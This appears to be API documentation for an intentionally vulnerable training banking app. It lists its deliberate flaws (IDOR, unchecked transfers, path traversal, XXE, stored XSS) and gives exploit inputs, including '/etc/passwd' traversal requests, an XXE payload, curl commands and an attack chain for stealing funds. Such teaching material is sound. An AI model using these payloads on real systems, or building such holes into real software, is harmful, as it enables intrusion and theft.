# 🔌 API Documentation

Complete reference for the CentralBank-SecLand-Vulnerable REST API.

⚠️ **Warning**: This API contains intentional security vulnerabilities for educational purposes.

## 📋 Base Information

- **Base URL**: `http://localhost:8080`
- **Content-Type**: `application/json` (unless specified otherwise)
- **Authentication**: Session-based (for protected endpoints)

## 🔐 Authentication Endpoints

### Register User
Creates a new user account.

```http
POST /api/auth/register
Content-Type: application/json

{
  "username": "string",
  "password": "string", 
  "fullName": "string"
}
```

**Response (201 Created):**
```json
{
  "id": 1,
  "username": "testuser",
  "password": "$2a$10$...", 
  "fullName": "Test User",
  "createdAt": "2025-07-19T22:00:00",
  "accounts": []
}
```

### Login
Authenticates a user and creates a session.

```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "string",
  "password": "string"
}
```

**Response (200 OK):**
```json
{
  "message": "Login successful!",
  "token": "simulated.jwt.token.for.username"
}
```

## 🏦 Account Management Endpoints

### Get All Accounts (🚨 Vulnerable)
**VULNERABILITY**: Returns ALL accounts in the system to any authenticated user.

```http
GET /api/accounts
Authorization: Required (session-based)
```

**Response (200 OK):**
```json
[
  {
    "id": 1,
    "accountNumber": "ADMIN-001",
    "accountType": "Checking",
    "balance": 1000000.00,
    "userId": 1,
    "createdAt": "2025-07-19T22:00:00"
  }
]
```

### Get User Accounts by ID (🚨 IDOR Vulnerable)
**VULNERABILITY**: Access any user's accounts without authorization check.

```http
GET /api/accounts/user/{userId}
Authorization: Required
```

**Example**: `GET /api/accounts/user/1`

## 💸 Transaction Endpoints

### Transfer Money (🚨 Critical Vulnerability)
**VULNERABILITIES**: IDOR + Business Logic Flaw

```http
POST /api/accounts/transfer
Authorization: Required
Content-Type: application/json

{
  "fromAccountId": 1,
  "toAccountNumber": "ADMIN-002", 
  "amount": 50000.00,
  "description": "Transfer description"
}
```

**Vulnerabilities:**
- No verification that user owns `fromAccountId`
- No balance validation (allows negative balances)

### Get Transaction History (🚨 IDOR Vulnerable)
**VULNERABILITY**: View any account's transaction history.

```http
GET /api/accounts/{accountId}/transactions
Authorization: Required
```

**Example**: `GET /api/accounts/1/transactions`

## 📁 File Operations (🚨 Path Traversal Vulnerable)

### Read File Contents
**VULNERABILITY**: Path traversal allows reading arbitrary files.

```http
GET /api/files/read/{filename}
```

**Examples:**
- `GET /api/files/read/test.txt` (normal)
- `GET /api/files/read/../../../etc/passwd` (exploit)

### Download File
**VULNERABILITY**: Path traversal in file downloads.

```http
GET /api/files/download?filename={filename}
```

**Examples:**
- `GET /api/files/download?filename=document.pdf` (normal)
- `GET /api/files/download?filename=../../../application.properties` (exploit)

### List Directory
**VULNERABILITY**: Directory traversal.

```http
GET /api/files/list?directory={directory}
```

## 📄 XML Processing (🚨 XXE Vulnerable)

### Import XML Transaction
**VULNERABILITY**: XML External Entity (XXE) attacks.

```http
POST /api/xml/import
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<transaction>
  <description>Normal transaction</description>
</transaction>
```

**XXE Exploit Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE transaction [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<transaction>
  <description>&xxe;</description>
</transaction>
```

### Validate XML
**VULNERABILITY**: XXE in validation process.

```http
POST /api/xml/validate
Content-Type: application/xml

<?xml version="1.0"?>
<transaction><description>Test</description></transaction>
```

### Process XML
**VULNERABILITY**: XXE + Information disclosure through detailed errors.

```http
POST /api/xml/process
Content-Type: application/xml

<?xml version="1.0"?>
<transaction><description>Test</description></transaction>
```

## 📊 Health & Monitoring

### Health Check
```http
GET /actuator/health
```

**Response:**
```json
{
  "status": "UP"
}
```

## 🚨 Security Vulnerabilities Summary

| Endpoint | Vulnerability | Severity | Description |
|----------|---------------|----------|-------------|
| `POST /api/accounts/transfer` | IDOR + Business Logic | **CRITICAL** | Transfer from any account, no balance check |
| `GET /api/accounts` | Information Disclosure | **HIGH** | Exposes all accounts |
| `GET /api/accounts/user/{id}` | IDOR | **HIGH** | Access any user's accounts |
| `GET /api/accounts/{id}/transactions` | IDOR | **HIGH** | View any account's transactions |
| `GET /api/files/read/{filename}` | Path Traversal | **HIGH** | Read arbitrary files |
| `GET /api/files/download` | Path Traversal | **HIGH** | Download arbitrary files |
| `GET /api/files/list` | Directory Traversal | **MEDIUM** | List arbitrary directories |
| `POST /api/xml/*` | XXE | **HIGH** | XML External Entity attacks |
| Various | Stored XSS | **MEDIUM** | Via transaction descriptions |

## 🛡️ Exploitation Examples

### Complete IDOR Attack Chain
1. **Register**: `POST /api/auth/register`
2. **Login**: `POST /api/auth/login`
3. **Enumerate**: `GET /api/accounts` (see all accounts)
4. **Steal**: `POST /api/accounts/transfer` (transfer from any account)

### File System Access
1. **Enum**: `GET /api/files/list?directory=../../../`
2. **Read**: `GET /api/files/read/../../../etc/passwd`
3. **Exfiltrate**: `GET /api/files/download?filename=../../../application.properties`

### XXE Attack
1. **Recon**: `POST /api/xml/process` with XXE to read `/etc/passwd`
2. **Config**: Read application properties via XXE
3. **SSRF**: Use XXE for internal network scanning

## 🔧 Testing Tools Integration

### cURL Examples
```bash
# Test XXE
curl -X POST http://localhost:8080/api/xml/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE transaction [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><transaction><description>&xxe;</description></transaction>'

# Test Path Traversal  
curl "http://localhost:8080/api/files/read/../../../application.properties"
```

### Burp Suite Configuration
1. Set proxy to `127.0.0.1:8080`
2. Navigate to `http://localhost`
3. Login and intercept requests
4. Modify `fromAccountId` in transfer requests
5. Test path traversal in file endpoints

---

**Remember: These vulnerabilities are intentional and for educational use only!**
